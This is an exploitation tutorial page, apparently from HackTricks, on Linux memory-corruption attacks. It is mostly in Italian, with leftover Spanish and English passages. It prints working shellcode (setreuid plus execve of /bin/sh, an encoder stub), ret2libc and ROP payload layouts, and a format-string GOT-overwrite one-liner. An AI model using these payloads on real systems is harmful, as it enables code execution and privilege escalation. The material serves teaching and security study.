# Linux Exploiting (Base) (SPA)

## Linux Exploiting (Base) (SPA)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

## **ASLR**

Address Space Layout Randomization

**Disabilita l'ASLR GLOBAL (root)**:\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
Riattiva l'ASLR GLOBAL: echo 2 > /proc/sys/kernel/randomize\_va\_space

**Disabilita per una singola esecuzione** (non richiede root):\
setarch \`arch\` -R ./esempio argomenti\
setarch \`uname -m\` -R ./esempio argomenti

**Disabilita la protezione dell'esecuzione dello stack**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack esempio.c -o esempio

**File core**\
ulimit -c unlimited\
gdb /exec file_core\
/etc/security/limits.conf -> \* soft core unlimited

**Testo**\
**Dati**\
**BSS**\
**Heap**

**Stack**

**Sezione BSS**: Variabili globali o statiche non inizializzate
```
static int i;
```
**Sezione DATA**: Variabili globali o statiche inizializzate
```
int i = 5;
```
**Sezione TESTO**: Istruzioni del codice (opcodes)

**Sezione HEAP**: Buffer allocati dinamicamente (malloc(), calloc(), realloc())

**Sezione STACK**: Lo stack (Argomenti passati, stringhe di ambiente (env), variabili locali...)

## **1. STACK OVERFLOWS**

> buffer overflow, buffer overrun, stack overrun, stack smashing

Segmentation fault o violazione di segmento: quando si cerca di accedere a un indirizzo di memoria che non √® stato assegnato al processo.

Per ottenere l'indirizzo di una funzione all'interno di un programma si pu√≤ fare:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Chiamata a sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

Visualizzare le interruzioni del kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep "\_\_NR\_"

setreuid(0,0); // \_\_NR\_setreuid 70\
execve("/bin/sh", args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; puliamo eax\
xor ebx, ebx ; ebx = 0 perch√© non ci sono argomenti da passare\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Esegui la syscall

**nasm -f elf assembly.asm** ‚Äî> Restituisce un .o\
**ld assembly.o -o shellcodeout** ‚Äî> Ci d√† un eseguibile formato dal codice assembly e possiamo ottenere gli opcode con **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Per verificare che sia effettivamente la nostra shellcode e ottenere gli OpCodes

**Verificare che la shellcode funzioni**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Per verificare che le chiamate di sistema vengano eseguite correttamente, √® necessario compilare il programma precedente e le chiamate di sistema devono apparire in **strace ./PROGRAMA_COMPILATO**

Quando si crea uno shellcode, si pu√≤ utilizzare un trucco. La prima istruzione √® un salto a una chiamata. La chiamata richiama il codice originale e inserisce anche l'EIP nello stack. Dopo l'istruzione di chiamata, abbiamo inserito la stringa di cui avevamo bisogno, quindi con quel EIP possiamo puntare alla stringa e continuare ad eseguire il codice.

ESEMPIO **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**Esecuzione di un Exploit usando lo Stack (/bin/sh):**

Per eseguire un exploit utilizzando lo stack (/bin/sh), √® possibile seguire i seguenti passaggi:

1. Identificare un programma vulnerabile che consenta l'iniezione di codice attraverso il buffer overflow.
2. Determinare la dimensione del buffer e la posizione del puntatore di ritorno.
3. Creare un payload che includa l'indirizzo del comando "/bin/sh".
4. Inserire il payload nel buffer, sovrascrivendo il puntatore di ritorno.
5. Avviare il programma vulnerabile per eseguire il payload e ottenere l'accesso alla shell di sistema (/bin/sh).

√à importante notare che l'esecuzione di exploit √® un'attivit√† illegale e pu√≤ comportare conseguenze legali. Queste informazioni sono fornite solo a scopo educativo e per la comprensione delle tecniche di hacking.
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**

L'istruzione `FNSTENV` viene utilizzata per salvare lo stato dell'ambiente a 108 byte di memoria. Questo stato include informazioni sulle impostazioni dei registri di controllo, dei registri di stato e dei registri dei dati in virgola mobile. L'istruzione `FNSTENV` pu√≤ essere utilizzata per ottenere informazioni utili durante l'esecuzione di un exploit su un sistema Linux.
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Egg Hunter:**

Consiste in un piccolo codice che scorre le pagine di memoria associate a un processo alla ricerca della shellcode memorizzata (cerca una firma inserita nella shellcode). Utile nei casi in cui si dispone solo di uno spazio limitato per iniettare il codice.

**Shellcode polimorfiche**

Sono shellcode cifrate che hanno un piccolo codice che le decifra e salta ad esse, utilizzando il trucco di Call-Pop, ecco un **esempio di cifratura di Cesare**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
1. **Attaccare il Frame Pointer (EBP)**

Utile in una situazione in cui possiamo modificare l'EBP ma non l'EIP.

Si sa che al termine di una funzione viene eseguito il seguente codice assembly:
```
movl               %ebp, %esp
popl                %ebp
ret
```
In this way, if the EBP can be modified when exiting a function (fvuln) that has been called by another function, when the function that called fvuln finishes, its EIP can be modified.

In fvuln, a false EBP can be introduced that points to a location where the address of the shellcode + 4 is located (4 must be added for the pop). Thus, when exiting the function, the value of &(\&Shellcode)+4 will be placed in ESP, with the pop subtracting 4 from ESP and pointing to the address of the shellcode when the ret is executed.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + padding + &(\&Shellcode)+4

**Off-by-One Exploit**\
Only the least significant byte of the EBP can be modified. An attack like the previous one can be carried out, but the memory that stores the address of the shellcode must share the first 3 bytes with the EBP.

## **4. Return to Libc Methods**

Useful method when the stack is not executable or leaves a very small buffer to modify.

ASLR causes functions to be loaded at different positions in memory with each execution. Therefore, this method may not be effective in that case. For remote servers, as the program is constantly being executed at the same address, it can be useful.

* **cdecl (C declaration)**: Puts the arguments on the stack and cleans the stack after exiting the function.
* **stdcall (standard call)**: Puts the arguments on the stack and the called function cleans it.
* **fastcall**: Puts the first two arguments in registers and the rest on the stack.

The address of the system instruction from libc is placed and the string "/bin/sh" is passed as an argument, usually from an environment variable. In addition, the address of the exit function is used so that once the shell is no longer needed, the program exits without problems (and writes logs).

**export SHELL=/bin/sh**

To find the addresses we need, we can look inside **GDB:**\
**p system**\
**p exit**\
**rabin2 -i executable** ‚Äî> Gives the address of all the functions used by the program when loaded\
(Inside a start or some breakpoint): **x/500s $esp** ‚Äî> Search for the string /bin/sh here

Once we have these addresses, the **exploit** would be:

"A" \* EBP DISTANCE + 4 (EBP: can be 4 "A"s, although it is better if it is the real EBP to avoid segmentation faults) + Address of **system** (will overwrite EIP) + Address of **exit** (when system("/bin/sh") finishes, this function will be called because the first 4 bytes of the stack are treated as the next EIP address to execute) + Address of "**/bin/sh**" (it will be the parameter passed to system)

In this way, the EIP will be overwritten with the address of system, which will receive the string "/bin/sh" as a parameter, and when it exits, it will execute the exit() function.

It is possible to encounter a situation where a byte of a function's address is null or a space (\x20). In that case, the addresses before that function can be disassembled, as there are likely to be several NOPs that allow us to call one of them instead of the function directly (for example, with > x/8i system-4).

This method works because when calling a function like system using the **ret** opcode instead of **call**, the function understands that the first 4 bytes will be the **EIP** address to return to.

An interesting technique with this method is to call **strncpy()** to move a payload from the stack to the heap and then use **gets()** to execute that payload.

Another interesting technique is the use of **mprotect()**, which allows assigning the desired permissions to any part of memory. It works or worked on BDS, MacOS, and OpenBSD, but not on Linux (it controls that write and execute permissions cannot be granted at the same time). With this attack, the stack could be reconfigured as executable.

**Function Chaining**

Based on the previous technique, this form of exploit consists of:\
Padding + \&Function1 + \&pop;ret; + \&arg\_fun1 + \&Function2 + \&pop;ret; + \&arg\_fun2 + ...

In this way, functions can be chained to be called. Additionally, if you want to use functions with multiple arguments, you can place the necessary arguments (e.g., 4) and put the 4 arguments and search for an address with opcodes: pop, pop, pop, pop, ret ‚Äî> **objdump -d executable**

**Chaining through Frame Spoofing (EBP Chaining)**

It consists of taking advantage of the ability to manipulate the EBP to chain the execution of several functions through the EBP and "leave;ret".

PADDING

* Place a false EBP in the EBP that points to: 2nd false EBP + the function to execute: (\&system() + \&leave;ret + &"/bin/sh")
* In the EIP, put the address of a function &(leave;ret)

Start the shellcode with the address to the next part of the shellcode, for example: 2nd false EBP + \&system() + &(leave;ret;) + &"/bin/sh"

The 2nd EBP would be: 3rd false EBP + \&system() + &(leave;ret;) + &"/bin/ls"

This shellcode can be repeated indefinitely in the memory parts that are accessible, so that a shellcode easily divisible into small chunks of memory is achieved.

(The execution of functions is chained by mixing the EBP and ret2lib vulnerabilities seen earlier)

## **5. Additional Methods**

**Ret2Ret**

Useful when it is not possible to place a stack address in the EIP (it is checked that the EIP does not contain 0xbf) or when the location of the shellcode cannot be calculated. However, the vulnerable function accepts a parameter (the shellcode will go here).

In this way, by changing the EIP to an address of a **ret**, the next address (which is the address of the first argument of the function) will be loaded. That is, the shellcode will be loaded.

The exploit would be: SHELLCODE + Padding (until EIP) + **\&ret** (the next bytes of the stack point to the start of the shellcode because the address of the parameter passed is placed on the stack)

Apparently, functions like **strncpy** remove from the stack the address where the shellcode was stored once they are complete, making this technique impossible. That is, the address passed to the function as an argument (the one that stores the shellcode) is modified by a 0x00, so when calling the second **ret**, it encounters a 0x00 and the program crashes.
```
**Ret2PopRet**
```
Se non abbiamo controllo sul primo argomento ma abbiamo controllo sul secondo o terzo, possiamo sovrascrivere EIP con un indirizzo a pop-ret o pop-pop-ret, a seconda di quello che ci serve.

**Tecnica di Murat**

In Linux, tutti i programmi vengono mappati a partire da 0xbfffffff.

Osservando come viene costruito lo stack di un nuovo processo in Linux, √® possibile sviluppare uno sfruttamento in modo che il programma venga avviato in un ambiente in cui l'unica variabile sia la shellcode. L'indirizzo di questa pu√≤ quindi essere calcolato come: addr = 0xbfffffff - 4 - strlen(NOME\_eseguibile\_completo) - strlen(shellcode)

In questo modo si otterrebbe facilmente l'indirizzo in cui si trova la variabile di ambiente con la shellcode.

Questo √® possibile grazie alla funzione execle che consente di creare un ambiente con solo le variabili di ambiente desiderate.

**Jump to ESP: Stile Windows**

Poich√© ESP punta sempre all'inizio dello stack, questa tecnica consiste nel sostituire EIP con l'indirizzo di una chiamata a **jmp esp** o **call esp**. In questo modo, la shellcode viene salvata dopo la sovrascrittura di EIP poich√© dopo l'esecuzione di **ret**, ESP punter√† all'indirizzo successivo, proprio dove √® stata salvata la shellcode.

Nel caso in cui ASLR non sia attivo su Windows o Linux, √® possibile chiamare **jmp esp** o **call esp** memorizzate in qualche oggetto condiviso. Se ASLR √® attivo, potrebbe essere cercato all'interno del programma vulnerabile stesso.

Inoltre, il fatto di poter posizionare la shellcode dopo la corruzione di EIP anzich√© nel mezzo dello stack consente alle istruzioni push o pop eseguite all'interno della funzione di non toccare la shellcode (cosa che potrebbe accadere se fosse posizionata nel mezzo dello stack della funzione).

In modo molto simile a questo, se sappiamo che una funzione restituisce l'indirizzo in cui √® memorizzata la shellcode, √® possibile chiamare **call eax** o **jmp eax (ret2eax)**.

**ROP (Return Oriented Programming) o frammenti di codice presi in prestito**

I frammenti di codice invocati sono noti come gadgets.

Questa tecnica consiste nel concatenare diverse chiamate a funzioni utilizzando la tecnica di **ret2libc** e l'uso di **pop,ret**.

In alcune architetture di processori, ogni istruzione √® un insieme di 32 bit (ad esempio MIPS). Tuttavia, su Intel le istruzioni hanno una dimensione variabile e pi√π istruzioni possono condividere un insieme di bit, ad esempio:

**movl $0xe4ff, -0x(%ebp)** ‚Äî> Contiene i byte 0xffe4 che possono anche essere tradotti come: **jmp \*%esp**

In questo modo √® possibile eseguire alcune istruzioni che non sono nemmeno presenti nel programma originale.

**ROPgadget.py** ci aiuta a trovare valori nei binari.

Questo programma serve anche per creare i **payload**. Puoi fornire la libreria da cui desideri estrarre i ROP e generer√† un payload in Python a cui fornisci l'indirizzo in cui si trova la libreria e il payload √® pronto per essere utilizzato come shellcode. Inoltre, poich√© utilizza chiamate di sistema, non esegue effettivamente nulla nello stack, ma semplicemente salva gli indirizzi dei ROP che verranno eseguiti tramite **ret**. Per utilizzare questo payload, √® necessario chiamare il payload tramite un'istruzione **ret**.

**Integer overflows**

Questo tipo di overflow si verifica quando una variabile non √® in grado di gestire un numero cos√¨ grande come quello passato, probabilmente a causa di una confusione tra variabili con e senza segno, ad esempio:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
Nell'esempio precedente vediamo che il programma si aspetta 2 parametri. Il primo √® la lunghezza della stringa successiva e il secondo √® la stringa stessa.

Se passiamo un numero negativo come primo parametro, verr√† verificato che len < 256 e supereremo questo filtro. Inoltre, strlen(buffer) sar√† minore di l, poich√© l √® un unsigned int e sar√† molto grande.

Questo tipo di overflow non cerca di scrivere qualcosa nel processo del programma, ma di superare filtri mal progettati per sfruttare altre vulnerabilit√†.

**Variabili non inizializzate**

Non si conosce il valore che pu√≤ assumere una variabile non inizializzata e potrebbe essere interessante osservarlo. Potrebbe assumere il valore che aveva una variabile della funzione precedente e questa potrebbe essere controllata dall'attaccante.

## **Format Strings**

In C, **`printf`** √® una funzione che pu√≤ essere utilizzata per **stampare** una stringa. Il **primo parametro** che questa funzione si aspetta √® il **testo grezzo con i formattatori**. I **parametri successivi** si aspettano i **valori** da **sostituire** ai **formattatori** nel testo grezzo.

La vulnerabilit√† si presenta quando un **testo dell'attaccante viene inserito come primo argomento** in questa funzione. L'attaccante sar√† in grado di creare un **input speciale sfruttando** le **capacit√† di formattazione** di printf per **scrivere qualsiasi dato in qualsiasi indirizzo**. In questo modo sar√† possibile **eseguire codice arbitrario**.

Formattatori:
```bash
%08x ‚Äî> 8 hex bytes
%d ‚Äî> Entire
%u ‚Äî> Unsigned
%s ‚Äî> String
%n ‚Äî> Number of written bytes
%hn ‚Äî> Occupies 2 bytes instead of 4
<n>$X ‚Äî> Direct access, Example: ("%3$d", var1, var2, var3) ‚Äî> Access to var3
```
**`%n`** **scrive** il **numero di byte scritti** nell'**indirizzo indicato**. Scrivendo **tanti byte** quanti il numero esadecimale che **vogliamo scrivere** √® possibile **scrivere qualsiasi dato**.
```bash
AAAA%.6000d%4\$n ‚Äî> Write 6004 in the address indicated by the 4¬∫ param
AAAA.%500\$08x ‚Äî> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

Questa √® la tabella che contiene l'**indirizzo** delle **funzioni esterne** utilizzate dal programma.

Ottieni l'indirizzo di questa tabella con: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

Osserva come dopo **caricare** l'**eseguibile** in GEF puoi **vedere** le **funzioni** che sono nel **GOT**: `gef‚û§ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

Utilizzando GEF puoi **avviare** una **sessione di debug** ed eseguire **`got`** per vedere la tabella got:

![](<../../.gitbook/assets/image (621).png>)

In un binario il GOT ha gli **indirizzi delle funzioni o** della sezione **PLT** che caricher√† l'indirizzo della funzione. Lo scopo di questa vulnerabilit√† √® **sovrascrivere l'entry GOT** di una funzione che verr√† eseguita successivamente **con** l'**indirizzo** del PLT della funzione **`system`**. Idealmente, si **sovrascriver√†** il **GOT** di una **funzione** che verr√† **chiamata con parametri controllati da te** (in modo da poter controllare i parametri inviati alla funzione di sistema).

Se **`system`** **non viene utilizzata** dallo script, la funzione di sistema **non avr√†** un'entry nel GOT. In questo scenario, sar√† **necessario prima ottenere l'indirizzo** della funzione `system`.

La **Procedure Linkage Table** √® una tabella **sola lettura** nel file ELF che memorizza tutti i **simboli necessari che richiedono una risoluzione**. Quando una di queste funzioni viene chiamata, il GOT **reindirizzer√†** il **flusso** al PLT in modo che possa **risolvere** l'**indirizzo** della funzione e scriverlo nel GOT.\
Successivamente, la **prossima volta** che viene effettuata una chiamata a quell'indirizzo, la funzione viene **chiamata direttamente** senza bisogno di risolverla.

Puoi vedere gli indirizzi PLT con **`objdump -j .plt -d ./vuln_binary`**

### **Flusso di exploit**

Come spiegato in precedenza, l'obiettivo sar√† **sovrascrivere** l'**indirizzo** di una **funzione** nella tabella GOT che verr√† chiamata successivamente. Idealmente, potremmo impostare l'**indirizzo su un shellcode** situato in una sezione eseguibile, ma molto probabilmente non saremo in grado di scrivere un shellcode in una sezione eseguibile.\
Quindi un'opzione diversa √® **sovrascrivere** una **funzione** che **riceve** i suoi **argomenti** dall'**utente** e **puntarla** alla **funzione `system`**.

Per scrivere l'indirizzo, di solito vengono eseguiti 2 passaggi: si **scrivono prima 2 byte** dell'indirizzo e poi gli altri 2. Per farlo viene utilizzato **`$hn`**.

**HOB** viene chiamato per i 2 byte pi√π alti dell'indirizzo\
**LOB** viene chiamato per i 2 byte pi√π bassi dell'indirizzo

Quindi, a causa del funzionamento delle stringhe di formato, √® necessario **scrivere prima il pi√π piccolo** tra \[HOB, LOB] e poi l'altro.

Se HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Se HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 N¬∫Param\_dir\_HOB LOB\_shell-HOB\_shell N¬∫Param\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Template di exploit delle stringhe di formato**

Puoi trovare un **template** per sfruttare il GOT utilizzando le stringhe di formato qui:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

Essenzialmente questa √® una struttura con **funzioni che verranno chiamate** prima che il programma finisca. Questo √® interessante se puoi chiamare il tuo **shellcode saltando a un indirizzo**, o in casi in cui devi tornare di nuovo a main per **sfruttare la stringa di formato una seconda volta**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Nota che questo **non creer√†** un **loop eterno** perch√© quando torni a main il canary si accorger√† che la fine dello stack potrebbe essere corrotta e la funzione non verr√† richiamata di nuovo. Quindi con questo sarai in grado di **avere un'altra esecuzione** della vulnerabilit√†.

### **Format Strings per Dumpare il Contenuto**

Una format string pu√≤ anche essere sfruttata per **dumpare il contenuto** dalla memoria del programma.\
Ad esempio, nella seguente situazione c'√® una **variabile locale nello stack che punta a una flag**. Se **trovi** dove in **memoria** si trova il **puntatore** alla **flag**, puoi fare in modo che **printf acceda** a quell'**indirizzo** e **stampi** la **flag**:

Quindi, la flag si trova in **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

E dal leak puoi vedere che il **puntatore alla flag** si trova nell'**ottavo** parametro:

![](<../../.gitbook/assets/image (623).png>)

Quindi, **accedendo** all'**ottavo parametro** puoi ottenere la flag:

![](<../../.gitbook/assets/image (624).png>)

Nota che seguendo l'**exploit precedente** e rendendoti conto che puoi **leakare il contenuto**, puoi **impostare puntatori** a **`printf`** nella sezione in cui l'**eseguibile** √® **caricato** e **dumparlo** **interamente**!

### **DTOR**

{% hint style="danger" %}
Oggi √® molto **strano trovare un binario con una sezione dtor**.
{% endhint %}

I distruttori sono funzioni che vengono **eseguite prima che il programma finisca**.\
Se riesci a **scrivere** un **indirizzo** a uno **shellcode** in **`__DTOR_END__`**, questo verr√† **eseguito** prima che il programma termini.\
Ottieni l'indirizzo di questa sezione con:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
Di solito troverai la sezione **DTOR** **tra** i valori `ffffffff` e `00000000`. Quindi se vedi solo quei valori, significa che **non c'√® alcuna funzione registrata**. Quindi **sovrascrivi** il **`00000000`** con l'**indirizzo** dello **shellcode** per eseguirlo.

### **Format Strings per Buffer Overflow**

La funzione **sprintf** sposta una stringa formattata in una variabile. Pertanto, √® possibile abusare della formattazione di una stringa per causare un **buffer overflow nella variabile** in cui viene copiato il contenuto. Ad esempio, il payload `%.44xAAAA` scriver√† **44B+"AAAA" nella variabile**, il che potrebbe causare un buffer overflow.

### **Strutture \_\_atexit**

{% hint style="danger" %}
Oggi √® molto **strano sfruttare questo**.
{% endhint %}

**`atexit()`** √® una funzione a cui vengono passate **altre funzioni come parametri**. Queste **funzioni** verranno **eseguite** quando si esegue un **`exit()`** o il **ritorno** del **main**. Se √® possibile **modificare** l'**indirizzo** di una di queste **funzioni** in modo che punti a uno shellcode, ad esempio, si otterr√† il **controllo** del **processo**, ma attualmente √® pi√π complicato. Attualmente gli **indirizzi delle funzioni** da eseguire sono **nascosti** dietro diverse strutture e infine l'indirizzo a cui punta non sono gli indirizzi delle funzioni, ma sono **criptati con XOR** e spostamenti con una **chiave casuale**. Quindi attualmente questo vettore di attacco non √® molto utile almeno su x86 e x64\_86. La funzione di **criptazione** √® **`PTR_MANGLE`**. **Altre architetture** come m68k, mips32, mips64, aarch64, arm, hppa... **non implementano la funzione di criptazione** perch√© **restituiscono lo stesso** valore che hanno ricevuto in input. Quindi queste architetture sarebbero attaccabili da questo vettore.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Oggi √® molto **strano sfruttare questo**.
{% endhint %}

**`Setjmp()`** permette di **salvare** il **contesto** (i registri)\
**`longjmp()`** permette di **ripristinare** il **contesto**.\
I registri salvati sono: `EBX, ESI, EDI, ESP, EIP, EBP`\
Quello che succede √® che EIP e ESP vengono passati alla funzione **`PTR_MANGLE`**, quindi le **architetture vulnerabili a questo attacco sono le stesse di sopra**.\
Sono utili per il recupero degli errori o gli interrupt.\
Tuttavia, da quello che ho letto, gli altri registri non sono protetti, **quindi se c'√® una `call ebx`, `call esi` o `call edi`** all'interno della funzione chiamata, si pu√≤ prendere il controllo. Oppure si potrebbe anche modificare EBP per modificare ESP.

**VTable e VPTR in C++**

Ogni classe ha una **Vtable** che √® un array di **puntatori a metodi**.

Ogni oggetto di una **classe** ha un **VPtr** che √® un **puntatore** all'array della sua classe. Il VPtr fa parte dell'intestazione di ogni oggetto, quindi se si riesce a **sovrascrivere** il **VPtr** potrebbe essere **modificato** per **puntare** a un metodo fittizio in modo che l'esecuzione di una funzione vada allo shellcode.

## **Misure preventive ed evasioni**

**ASLR non cos√¨ casuale**

PaX divide lo spazio degli indirizzi del processo in 3 gruppi:

Codice e dati inizializzati e non inizializzati: .text, .data e .bss ‚Äî> 16 bit di entropia nella variabile delta\_exec, questa variabile viene inizializzata casualmente con ogni processo e viene sommata agli indirizzi iniziali

Memoria assegnata da mmap() e librerie condivise ‚Äî> 16 bit, delta\_mmap

Lo stack ‚Äî> 24 bit, delta\_stack ‚Äî> In realt√† 11 (dal byte 10¬∫ al 20¬∫ incluso) ‚Äî> allineato a 16 byte ‚Äî> 524.288 possibili indirizzi reali dello stack

Le variabili di ambiente e gli argomenti si spostano meno di un buffer nello stack.

**Return-into-printf**

√à una tecnica per convertire un buffer overflow in un errore di stringa di formato. Consiste nel sostituire l'EIP in modo che punti a una printf della funzione e passargli come argomento una stringa di formato manipolata per ottenere valori sullo stato del processo.

**Attacco alle librerie**

Le librerie si trovano in una posizione con 16 bit di casualit√† = 65636 possibili indirizzi. Se un server vulnerabile chiama fork(), lo spazio degli indirizzi di memoria viene clonato nel processo figlio e rimane intatto. Pertanto, √® possibile tentare un attacco di forza bruta alla funzione usleep() di libc passando "16" come argomento in modo che quando impieghi pi√π tempo del normale a rispondere, la funzione sar√† stata trovata. Sapendo dove si trova questa funzione, √® possibile ottenere delta\_mmap e calcolare gli altri.

L'unico modo per essere sicuri che l'ASLR funzioni √® utilizzare un'architettura a 64 bit. L√¨ non ci sono attacchi di forza bruta.

**StackGuard e StackShield**

**StackGuard** inserisce prima dell'EIP ‚Äî> 0x000aff0d(null, \n, EndOfFile(EOF), \r) ‚Äî> Sono ancora vulnerabili recv(), memcpy(), read(), bcoy() e non protegge l'EBP

**StackShield** √® pi√π elaborato di StackGuard

Salva in una tabella (Global Return Stack) tutti gli indirizzi EIP di ritorno in modo che l'overflow non causi danni. Inoltre, √® possibile confrontare entrambi gli indirizzi per vedere se c'√® stato un overflow.

√à anche possibile controllare l'indirizzo di ritorno con un valore limite, quindi se l'EIP va in un posto diverso dal solito come lo spazio dei dati, lo si sapr√†. Ma questo pu√≤ essere aggirato con Ret-to-lib, ROPs o ret2ret.

Come si pu√≤ vedere, StackShield non protegge nemmeno le variabili locali.

**Stack Smash Protector (ProPolice) -fstack-protector**

Il canary viene inserito prima dell'EBP. Riordina le variabili locali in modo che i buffer siano nelle posizioni pi√π alte e quindi non possano sovrascrivere altre variabili.

Inoltre, fa una copia sicura degli argomenti passati sopra la pila (sopra le vars locali) e usa queste copie come argomenti.

Non pu√≤ proteggere array con meno di 8 elementi o buffer che fanno parte di una struttura dell'utente.

Il canary √® un numero casuale preso da "/dev/urandom" o se non √® disponibile √® 0xff0a0000. Viene memorizzato in TLS (Thread Local Storage). I thread condividono lo stesso spazio di memoria, il TLS √® un'area che contiene variabili globali o statiche per ogni thread. Tuttavia, in teoria queste vengono copiate dal processo padre anche se il processo figlio potrebbe modificare questi dati senza modificare quelli del padre o degli altri figli. Il problema √® che se si utilizza fork() ma non si crea un nuovo canary, allora tutti i processi (padre e figli) utilizzano lo stesso canary. In i386 viene memorizzato in gs:0x14 e in x86\_64 viene memorizzato in fs:0x28

Questa protezione individua le funzioni che hanno buffer che possono essere attaccati e include in esse del codice all'inizio della funzione per inserire il canary e del codice alla fine per verificarlo.

La funzione fork() crea una copia esatta del processo padre, quindi se un server web chiama fork() √® possibile un attacco di forza bruta byte per byte fino a scoprire il canary utilizzato.

